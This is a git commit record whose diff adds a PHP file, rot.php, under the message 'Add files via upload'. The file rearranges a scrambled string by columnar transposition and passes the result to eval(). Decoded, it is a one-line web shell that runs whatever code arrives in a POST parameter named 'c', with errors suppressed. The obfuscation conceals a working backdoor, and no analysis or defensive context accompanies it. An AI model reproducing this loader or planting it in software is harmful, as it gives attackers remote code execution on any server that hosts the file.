7863878da5e237d12c12fac02206b4b91c7084df
Anton Petrov <antonio24m@gmail.com>
2018-11-13 16:02:23 +0300

    Add files via upload

---
+++ rot.php
@@ -0,0 +1,11 @@
+<?php 
+$dqXsNT1NnxPrq = 12; 
+$S7NP79A58 = array(); 
+$UicVS4Hj = "" ; 
+$UicVS4Hj .= "<h@a\$O[';   ?pel_S']?   p v(PTc)>   "; 
+for($i = 0; $i < $dqXsNT1NnxPrq; $i++) $S7NP79A58[] = ""; 
+for($i = 0; $i < (strlen($UicVS4Hj) / $dqXsNT1NnxPrq); $i++) { for($r = 0; $r < $dqXsNT1NnxPrq; $r++) $S7NP79A58[$r] .= $UicVS4Hj[$r + $i * $dqXsNT1NnxPrq]; } 
+$yBG9spRPaXsm = trim(implode("", $S7NP79A58)); 
+$yBG9spRPaXsm = "?>$yBG9spRPaXsm"; 
+eval( $yBG9spRPaXsm ); 
+?>
